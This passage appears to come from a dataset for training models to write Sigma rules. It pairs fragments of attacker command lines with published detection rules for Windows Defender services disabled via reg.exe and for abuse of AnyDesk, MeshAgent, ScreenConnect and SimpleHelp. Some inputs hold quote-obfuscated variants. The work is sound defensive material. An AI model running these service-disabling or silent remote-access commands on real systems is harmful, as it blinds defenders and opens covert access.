'\\WdFilter'\n            - '\\WdNisDrv'\n            - '\\WdNisSvc'\n            - '\\WinDefend'\n            - '\\wscsvc'\n            - '\\wuauserv'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "reg add d 4 v Start \\AppIDSvc \\MsMpSvc \\NisSrv \\SecurityHealthService \\Sense \\UsoSvc \\WdBoot \\WdFilter \\WdNisDrv \\WdNisSvc \\WinDefend \\wscsvc \\wuauserv", "output": "title: Security Service Disabled Via Reg.EXE\nid: 5e95028c-5229-4214-afae-d653d573d0ec\nstatus: test\ndescription: Detects execution of \"reg.exe\" to disable security services such as Windows Defender.\nreferences:\n    - https://twitter.com/JohnLaTwC/status/1415295021041979392\n    - https://github.com/gordonbay/Windows-On-Reins/blob/e587ac7a0407847865926d575e3c46f68cf7c68d/wor.ps1\n    - https://vms.drweb.fr/virus/?i=24144899\n    - https://bidouillesecurity.com/disable-windows-defender-in-powershell/\nauthor: Florian Roth (Nextron Systems), John Lambert (idea), elhoim\ndate: 2021-07-14\nmodified: 2023-06-05\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_reg_add:\n        CommandLine|contains|all:\n            - 'reg'\n            - 'add'\n    selection_cli_reg_start:\n        CommandLine|contains|all:\n            - 'd 4'\n            - 'v Start'\n        CommandLine|contains:\n            - '\\AppIDSvc'\n            - '\\MsMpSvc'\n            - '\\NisSrv'\n            - '\\SecurityHealthService'\n            - '\\Sense'\n            - '\\UsoSvc'\n            - '\\WdBoot'\n            - '\\WdFilter'\n            - '\\WdNisDrv'\n            - '\\WdNisSvc'\n            - '\\WinDefend'\n            - '\\wscsvc'\n            - '\\wuauserv'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "/c echo .exe --set-password", "output": "title: Remote Access Tool - AnyDesk Execution\nid: b52e84a3-029e-4529-b09b-71d19dd27e94\nstatus: test\nrelated:\n    - id: 065b00ca-5d5c-4557-ac95-64a6d0b64d86\n      type: similar\ndescription: |\n    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\n    These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\n    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-2---anydesk-files-detected-test-on-windows\n    - https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/\nauthor: frack113\ndate: 2022-02-11\nmodified: 2025-02-24\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith:\n              - '\\AnyDesk.exe'\n              - '\\AnyDeskMSI.exe'\n        - Description: AnyDesk\n        - Product: AnyDesk\n        - Company: AnyDesk Software GmbH\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "/c echo \\\".e\\\"xe --set-password", "output": "title: Remote Access Tool - AnyDesk Execution\nid: b52e84a3-029e-4529-b09b-71d19dd27e94\nstatus: test\nrelated:\n    - id: 065b00ca-5d5c-4557-ac95-64a6d0b64d86\n      type: similar\ndescription: |\n    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\n    These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\n    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-2---anydesk-files-detected-test-on-windows\n    - https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/\nauthor: frack113\ndate: 2022-02-11\nmodified: 2025-02-24\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith:\n              - '\\AnyDesk.exe'\n              - '\\AnyDeskMSI.exe'\n        - Description: AnyDesk\n        - Product: AnyDesk\n        - Company: AnyDesk Software GmbH\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "/c echo --set-password", "output": "title: Remote Access Tool - AnyDesk Execution\nid: b52e84a3-029e-4529-b09b-71d19dd27e94\nstatus: test\nrelated:\n    - id: 065b00ca-5d5c-4557-ac95-64a6d0b64d86\n      type: similar\ndescription: |\n    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\n    These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\n    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-2---anydesk-files-detected-test-on-windows\n    - https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/\nauthor: frack113\ndate: 2022-02-11\nmodified: 2025-02-24\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith:\n              - '\\AnyDesk.exe'\n              - '\\AnyDeskMSI.exe'\n        - Description: AnyDesk\n        - Product: AnyDesk\n        - Company: AnyDesk Software GmbH\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "/c echo .exe --set-password", "output": "title: Remote Access Tool - AnyDesk Execution\nid: b52e84a3-029e-4529-b09b-71d19dd27e94\nstatus: test\nrelated:\n    - id: 065b00ca-5d5c-4557-ac95-64a6d0b64d86\n      type: similar\ndescription: |\n    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\n    These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\n    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-2---anydesk-files-detected-test-on-windows\n    - https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/\nauthor: frack113\ndate: 2022-02-11\nmodified: 2025-02-24\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith:\n              - '\\AnyDesk.exe'\n              - '\\AnyDeskMSI.exe'\n        - Description: AnyDesk\n        - Product: AnyDesk\n        - Company: AnyDesk Software GmbH\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\AnyDesk.exe --remove --uninstall", "output": "title: Remote Access Tool - AnyDesk Execution\nid: b52e84a3-029e-4529-b09b-71d19dd27e94\nstatus: test\nrelated:\n    - id: 065b00ca-5d5c-4557-ac95-64a6d0b64d86\n      type: similar\ndescription: |\n    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\n    These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\n    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-2---anydesk-files-detected-test-on-windows\n    - https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/\nauthor: frack113\ndate: 2022-02-11\nmodified: 2025-02-24\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith:\n              - '\\AnyDesk.exe'\n              - '\\AnyDeskMSI.exe'\n        - Description: AnyDesk\n        - Product: AnyDesk\n        - Company: AnyDesk Software GmbH\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\AnyDesk.exe --remove \"--uninstall\"", "output": "title: Remote Access Tool - AnyDesk Execution\nid: b52e84a3-029e-4529-b09b-71d19dd27e94\nstatus: test\nrelated:\n    - id: 065b00ca-5d5c-4557-ac95-64a6d0b64d86\n      type: similar\ndescription: |\n    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\n    These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\n    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-2---anydesk-files-detected-test-on-windows\n    - https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/\nauthor: frack113\ndate: 2022-02-11\nmodified: 2025-02-24\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith:\n              - '\\AnyDesk.exe'\n              - '\\AnyDeskMSI.exe'\n        - Description: AnyDesk\n        - Product: AnyDesk\n        - Company: AnyDesk Software GmbH\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\AnyDesk --remove --uninstall", "output": "title: Remote Access Tool - AnyDesk Execution\nid: b52e84a3-029e-4529-b09b-71d19dd27e94\nstatus: test\nrelated:\n    - id: 065b00ca-5d5c-4557-ac95-64a6d0b64d86\n      type: similar\ndescription: |\n    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\n    These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\n    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-2---anydesk-files-detected-test-on-windows\n    - https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/\nauthor: frack113\ndate: 2022-02-11\nmodified: 2025-02-24\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith:\n              - '\\AnyDesk.exe'\n              - '\\AnyDeskMSI.exe'\n        - Description: AnyDesk\n        - Product: AnyDesk\n        - Company: AnyDesk Software GmbH\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\AnyDesk.exe --remove --uninstall", "output": "title: Remote Access Tool - AnyDesk Execution\nid: b52e84a3-029e-4529-b09b-71d19dd27e94\nstatus: test\nrelated:\n    - id: 065b00ca-5d5c-4557-ac95-64a6d0b64d86\n      type: similar\ndescription: |\n    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\n    These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\n    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-2---anydesk-files-detected-test-on-windows\n    - https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/\nauthor: frack113\ndate: 2022-02-11\nmodified: 2025-02-24\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith:\n              - '\\AnyDesk.exe'\n              - '\\AnyDeskMSI.exe'\n        - Description: AnyDesk\n        - Product: AnyDesk\n        - Company: AnyDesk Software GmbH\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "--install --start-with-win --silent", "output": "title: Remote Access Tool - AnyDesk Execution\nid: b52e84a3-029e-4529-b09b-71d19dd27e94\nstatus: test\nrelated:\n    - id: 065b00ca-5d5c-4557-ac95-64a6d0b64d86\n      type: similar\ndescription: |\n    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\n    These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\n    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-2---anydesk-files-detected-test-on-windows\n    - https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/\nauthor: frack113\ndate: 2022-02-11\nmodified: 2025-02-24\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith:\n              - '\\AnyDesk.exe'\n              - '\\AnyDeskMSI.exe'\n        - Description: AnyDesk\n        - Product: AnyDesk\n        - Company: AnyDesk Software GmbH\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "--install --start-\"with-win\" --silent", "output": "title: Remote Access Tool - AnyDesk Execution\nid: b52e84a3-029e-4529-b09b-71d19dd27e94\nstatus: test\nrelated:\n    - id: 065b00ca-5d5c-4557-ac95-64a6d0b64d86\n      type: similar\ndescription: |\n    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\n    These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\n    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-2---anydesk-files-detected-test-on-windows\n    - https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/\nauthor: frack113\ndate: 2022-02-11\nmodified: 2025-02-24\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith:\n              - '\\AnyDesk.exe'\n              - '\\AnyDeskMSI.exe'\n        - Description: AnyDesk\n        - Product: AnyDesk\n        - Company: AnyDesk Software GmbH\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "--install --silent --start-with-win", "output": "title: Remote Access Tool - AnyDesk Execution\nid: b52e84a3-029e-4529-b09b-71d19dd27e94\nstatus: test\nrelated:\n    - id: 065b00ca-5d5c-4557-ac95-64a6d0b64d86\n      type: similar\ndescription: |\n    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\n    These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\n    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-2---anydesk-files-detected-test-on-windows\n    - https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/\nauthor: frack113\ndate: 2022-02-11\nmodified: 2025-02-24\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith:\n              - '\\AnyDesk.exe'\n              - '\\AnyDeskMSI.exe'\n        - Description: AnyDesk\n        - Product: AnyDesk\n        - Company: AnyDesk Software GmbH\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\meshagent.exe \\cmd.exe \\powershell.exe \\pwsh.exe", "output": "title: Remote Access Tool - MeshAgent Command Execution via MeshCentral\nid: 74a2b202-73e0-4693-9a3a-9d36146d0775\nstatus: experimental\ndescription: |\n    Detects the use of MeshAgent to execute commands on the target host, particularly when threat actors might abuse it to execute commands directly.\n    MeshAgent can execute commands on the target host by leveraging win-console to obscure their activities and win-dispatcher to run malicious code through IPC with child processes.\nreferences:\n    - https://github.com/Ylianst/MeshAgent\n    - https://github.com/Ylianst/MeshAgent/blob/52cf129ca43d64743181fbaf940e0b4ddb542a37/modules/win-dispatcher.js#L173\n    - https://github.com/Ylianst/MeshAgent/blob/52cf129ca43d64743181fbaf940e0b4ddb542a37/modules/win-info.js#L55\nauthor: '@Kostastsale'\ndate: 2024-09-22\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|endswith: '\\meshagent.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n    condition: selection\nfalsepositives:\n    - False positives can be found in environments using MessAgent for remote management, analysis should prioritize the grandparent process, MessAgent.exe, and scrutinize the resulting child processes triggered by any suspicious interactive commands directed at the target host.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\meshagent.exe \\\"\\cmd\\\".exe \\powershell.exe \\pwsh.exe", "output": "title: Remote Access Tool - MeshAgent Command Execution via MeshCentral\nid: 74a2b202-73e0-4693-9a3a-9d36146d0775\nstatus: experimental\ndescription: |\n    Detects the use of MeshAgent to execute commands on the target host, particularly when threat actors might abuse it to execute commands directly.\n    MeshAgent can execute commands on the target host by leveraging win-console to obscure their activities and win-dispatcher to run malicious code through IPC with child processes.\nreferences:\n    - https://github.com/Ylianst/MeshAgent\n    - https://github.com/Ylianst/MeshAgent/blob/52cf129ca43d64743181fbaf940e0b4ddb542a37/modules/win-dispatcher.js#L173\n    - https://github.com/Ylianst/MeshAgent/blob/52cf129ca43d64743181fbaf940e0b4ddb542a37/modules/win-info.js#L55\nauthor: '@Kostastsale'\ndate: 2024-09-22\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|endswith: '\\meshagent.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n    condition: selection\nfalsepositives:\n    - False positives can be found in environments using MessAgent for remote management, analysis should prioritize the grandparent process, MessAgent.exe, and scrutinize the resulting child processes triggered by any suspicious interactive commands directed at the target host.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\meshagent \\cmd \\powershell \\pwsh", "output": "title: Remote Access Tool - MeshAgent Command Execution via MeshCentral\nid: 74a2b202-73e0-4693-9a3a-9d36146d0775\nstatus: experimental\ndescription: |\n    Detects the use of MeshAgent to execute commands on the target host, particularly when threat actors might abuse it to execute commands directly.\n    MeshAgent can execute commands on the target host by leveraging win-console to obscure their activities and win-dispatcher to run malicious code through IPC with child processes.\nreferences:\n    - https://github.com/Ylianst/MeshAgent\n    - https://github.com/Ylianst/MeshAgent/blob/52cf129ca43d64743181fbaf940e0b4ddb542a37/modules/win-dispatcher.js#L173\n    - https://github.com/Ylianst/MeshAgent/blob/52cf129ca43d64743181fbaf940e0b4ddb542a37/modules/win-info.js#L55\nauthor: '@Kostastsale'\ndate: 2024-09-22\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|endswith: '\\meshagent.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n    condition: selection\nfalsepositives:\n    - False positives can be found in environments using MessAgent for remote management, analysis should prioritize the grandparent process, MessAgent.exe, and scrutinize the resulting child processes triggered by any suspicious interactive commands directed at the target host.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\meshagent.exe \\pwsh.exe \\powershell.exe \\cmd.exe", "output": "title: Remote Access Tool - MeshAgent Command Execution via MeshCentral\nid: 74a2b202-73e0-4693-9a3a-9d36146d0775\nstatus: experimental\ndescription: |\n    Detects the use of MeshAgent to execute commands on the target host, particularly when threat actors might abuse it to execute commands directly.\n    MeshAgent can execute commands on the target host by leveraging win-console to obscure their activities and win-dispatcher to run malicious code through IPC with child processes.\nreferences:\n    - https://github.com/Ylianst/MeshAgent\n    - https://github.com/Ylianst/MeshAgent/blob/52cf129ca43d64743181fbaf940e0b4ddb542a37/modules/win-dispatcher.js#L173\n    - https://github.com/Ylianst/MeshAgent/blob/52cf129ca43d64743181fbaf940e0b4ddb542a37/modules/win-info.js#L55\nauthor: '@Kostastsale'\ndate: 2024-09-22\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|endswith: '\\meshagent.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n    condition: selection\nfalsepositives:\n    - False positives can be found in environments using MessAgent for remote management, analysis should prioritize the grandparent process, MessAgent.exe, and scrutinize the resulting child processes triggered by any suspicious interactive commands directed at the target host.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ScreenConnect.Service.exe \\cmd.exe \\csc.exe", "output": "title: Remote Access Tool - ScreenConnect Execution\nid: 57bff678-25d1-4d6c-8211-8ca106d12053\nstatus: test\ndescription: |\n    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\n    These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\n    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-5---screenconnect-application-download-and-install-on-windows\nauthor: frack113\ndate: 2022-02-13\nmodified: 2023-03-05\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Description: 'ScreenConnect Service'\n        - Product: 'ScreenConnect'\n        - Company: 'ScreenConnect Software'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of the tool\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ScreenConnect.Service.exe \"\\cmd.exe\" \\csc.exe", "output": "title: Remote Access Tool - ScreenConnect Execution\nid: 57bff678-25d1-4d6c-8211-8ca106d12053\nstatus: test\ndescription: |\n    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\n    These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\n    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-5---screenconnect-application-download-and-install-on-windows\nauthor: frack113\ndate: 2022-02-13\nmodified: 2023-03-05\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Description: 'ScreenConnect Service'\n        - Product: 'ScreenConnect'\n        - Company: 'ScreenConnect Software'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of the tool\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ScreenConnect.Service \\cmd \\csc", "output": "title: Remote Access Tool - ScreenConnect Execution\nid: 57bff678-25d1-4d6c-8211-8ca106d12053\nstatus: test\ndescription: |\n    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\n    These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\n    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-5---screenconnect-application-download-and-install-on-windows\nauthor: frack113\ndate: 2022-02-13\nmodified: 2023-03-05\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Description: 'ScreenConnect Service'\n        - Product: 'ScreenConnect'\n        - Company: 'ScreenConnect Software'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of the tool\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ScreenConnect.Service.exe \\cmd.exe \\csc.exe", "output": "title: Remote Access Tool - ScreenConnect Execution\nid: 57bff678-25d1-4d6c-8211-8ca106d12053\nstatus: test\ndescription: |\n    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\n    These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\n    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-5---screenconnect-application-download-and-install-on-windows\nauthor: frack113\ndate: 2022-02-13\nmodified: 2023-03-05\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Description: 'ScreenConnect Service'\n        - Product: 'ScreenConnect'\n        - Company: 'ScreenConnect Software'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of the tool\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SimpleService.exe", "output": "title: Remote Access Tool - Simple Help Execution\nid: 95e60a2b-4705-444b-b7da-ba0ea81a3ee2\nstatus: test\ndescription: |\n    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\n    These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\n    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\nreferences:\n    - https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2024-02-23\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|contains:\n            - '\\JWrapper-Remote Access\\'\n            - '\\JWrapper-Remote Support\\'\n        Image|endswith: '\\SimpleService.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of the tool\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"S\"\"i\"\"m\"\"p\"\"l\"\"e\"\"S\"\"e\"\"r\"\"v\"\"i\"\"c\"\"e\"\".\"\"e\"\"x\"\"e\"", "output": "title: Remote Access Tool - Simple Help Execution\nid: 95e60a2b-4705-444b-b7da-ba0ea81a3ee2\nstatus: test\ndescription: |\n    An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\n    These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\n    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\nreferences:\n    - https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2024-02-23\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: 